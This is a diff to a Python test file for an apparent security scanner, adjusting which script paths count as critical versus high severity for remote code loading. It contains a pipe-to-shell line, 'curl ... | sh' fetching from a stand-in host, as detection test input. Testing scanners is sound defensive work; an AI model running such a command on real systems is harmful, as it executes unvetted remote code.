@@ -157,10 +157,19 @@ def test_importable_source_under_infra_still_counts():
 
 def test_other_scripts_still_block():
     src = "curl -fsSL https://example.org/x.sh | sh\n"
-    for path in ("scripts/setup_dev.sh", "bin/run.sh", "src/start.sh"):
+    for path in ("bin/run.sh", "src/start.sh", "lib/setup_dev.sh"):
         hits = _hits(src, path, "dynamic_remote_load")
         assert hits and hits[0].severity == "critical", path
         assert _finding_is_blocking(hits[0]), path
+
+
+def test_hand_run_helper_script_is_high_until_run():
+    # Design review 2026-11-10: a shell helper under scripts/ data/ examples/ docs/ is
+    # high (Review) on its own; the package-level tree check restores critical when
+    # anything runs it (tests/test_helper_script_pipe_shell.py).
+    src = "curl -fsSL https://example.org/x.sh | sh\n"
+    hits = _hits(src, "scripts/setup_dev.sh", "dynamic_remote_load")
+    assert hits and hits[0].severity == "high"
 
 
 # ---------------------------------------------------------------- installer scripts
